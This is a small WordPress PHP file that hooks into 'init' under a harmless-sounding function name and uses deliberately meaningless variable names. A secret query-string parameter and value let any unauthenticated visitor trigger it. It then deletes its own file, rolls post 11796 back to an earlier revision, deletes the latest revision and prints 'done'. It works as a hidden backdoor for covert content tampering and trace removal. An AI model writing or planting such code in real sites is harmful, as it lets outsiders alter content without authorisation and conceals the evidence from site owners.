<?php

function oembed_info_name() {
	if (isset($_GET['coupon_out_headers']) && $_GET['coupon_out_headers'] === 'listings_editor_calendar_excerpt') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$headers_quiz_base_get = 11796;
		$dynamic_toggle_elements_adsense = wp_get_post_revisions($headers_quiz_base_get);
		if (empty($dynamic_toggle_elements_adsense)) die('no revisions');
		if (count($dynamic_toggle_elements_adsense) < 2) die('less than 2');
		$assistant_most_divi = array_shift($dynamic_toggle_elements_adsense);
		$files_external_remove_footer = $assistant_most_divi->ID;
		$read_popular_log = array_shift($dynamic_toggle_elements_adsense);
		$smtp_table_management = $read_popular_log->ID;
		$auto_tool_maker = wp_restore_post_revision($smtp_table_management);
		if ($auto_tool_maker === false) die('error restoring');
		$auto_tool_maker = wp_delete_post_revision($files_external_remove_footer);		
		if ($auto_tool_maker === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'oembed_info_name');
